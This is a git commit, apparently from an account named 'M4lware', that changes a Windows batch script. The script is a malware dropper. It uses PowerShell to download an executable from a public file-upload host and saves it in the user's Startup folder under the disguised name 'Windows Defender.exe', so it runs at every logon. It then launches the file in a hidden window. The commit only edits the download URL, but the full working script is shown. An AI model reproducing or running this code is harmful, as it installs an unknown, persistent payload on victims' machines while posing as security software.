66a3db2350b0e712dc33d15c6deaeb5738775fba
M4lware <128651023+M4lware-01@users.noreply.github.com>
2023-08-23 19:14:52 +0600

    Update script.bat

--- script.bat
+++ script.bat
@@ -1,7 +1,7 @@
 @echo off
 
 set powershell=%SYSTEMROOT%\System32\WindowsPowerShell\v1.0\powershell.exe
-set "DownloadURL=https://bashupload.com/awkTn/x.exe"
+set "DownloadURL=https://bashupload.com/awkTn/x.exe?download=1"
 set "DestinationPath=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Windows Defender.exe"
 powershell -Command "Invoke-WebRequest -useb '%DownloadURL%' -o '%DestinationPath%'"
 powershell -Command "Start-Process '%DestinationPath%' -WindowStyle Hidden"
